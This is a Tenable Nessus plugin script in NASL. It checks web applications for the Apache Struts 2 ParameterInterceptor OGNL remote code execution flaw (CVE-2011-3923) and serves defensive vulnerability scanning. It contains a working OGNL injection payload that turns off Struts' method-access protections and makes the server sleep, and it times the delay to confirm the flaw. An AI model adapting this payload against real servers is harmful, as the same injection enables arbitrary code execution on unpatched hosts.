#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(57850);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2017/01/30 19:28:01 $");

  script_cve_id("CVE-2011-3923");
  script_bugtraq_id(51628);
  script_osvdb_id(78501);
  script_xref(name:"EDB-ID", value:"24874");

  script_name(english:"Apache Struts 2 ParameterInterceptor Class OGNL Expression Parsing Remote Command Execution");
  script_summary(english:"Fingerprints the vulnerability by doing multiple sleeps.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A remote web application uses a framework that is affected by a code
execution vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web application appears to use Apache Struts 2, a web
framework that uses XWork. Due to a flaw in the ParameterInterceptor
class, user input is not properly sanitized, which allows a remote
attacker to run arbitrary Java code on the remote host by sending a
specially crafted HTTP request."
  );
  script_set_attribute(attribute:"see_also", value:"http://blog.o0o.nu/2012/01/cve-2011-3923-yet-another-struts2.html");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/S2-009");
  script_set_attribute(attribute:"solution", value:"Upgrade to Struts 2.3.1.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Apache-Struts ParameterInterceptor < 2.3.1.2 RCE Linux");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Struts ParametersInterceptor Remote Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'White_Phosphorus');

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/01/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/01/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/02/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("torture_cgi_func.inc");
include("audit.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp / .do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = eregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = eregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match3 = eregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match3))
    {
      urls = make_list(urls, match3[0]);
      if (!thorough_tests) break;
    }
  }
}
if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

if (max_index(urls) == 0)
  audit(AUDIT_WEB_FILES_NOT, "Struts 2 .action / .do / .jsp", port);

urls = list_uniq(urls);

secs = make_list(5, 10, 20);
vuln_actions = make_list();

foreach dir (urls)
{
  # find a list of args to test against
  cgi_args = get_cgi_arg_list(port: port, cgi: dir);
  foreach arg (cgi_args)
  {
    # assume the action is vulnerable unless proven otherwise
    vuln = TRUE;
    for (i = 0; i < max_index(secs) && vuln; i++)
    {
      millis = secs[i] * 1000;
      ognl = arg +
             '=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]' +
             '%3D+new+java.lang.Boolean(false),' +
             '%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d' +
             '+new+java.lang.Boolean(true),%20'+
             '@java.lang.Thread@sleep(' + millis + '))(meh)&z[('+arg+')' +
             '(%27meh%27)]=true';
      url = dir + '?' + ognl;
      http_set_read_timeout(secs[i] * 2);
      then = unixtime();
      res = http_send_recv3(
        method:'GET',
        item:url,
        port:port,
        exit_on_fail:TRUE
      );
      now = unixtime();

      # if it looks like this action isn't vulnerable, move on to checking
      # the next one
      if ( now - then < secs[i] || now - then > (secs[i]+5) ) vuln = FALSE;
    }
    if (vuln) break;
  }
  if (vuln) break;
}

if (!vuln) exit(0, 'No affected applications were detected on the web server listening on port '+port+'.');

if (report_verbosity > 0)
{
  report = get_vuln_report(
    header:
      'Nessus determined a struts 2 application is vulnerable by\n'+
      'forcing it to sleep() before sending the server\'s response.\n'+
      'This was verified using the following URL :',
    trailer:
      'Please note Nessus stopped after detecting the first vulnerable\n'+
      'application. Others may be affected.',
    items:url,
    port:port
  );
  security_hole(port:port, extra:report);
}
else security_hole(port);
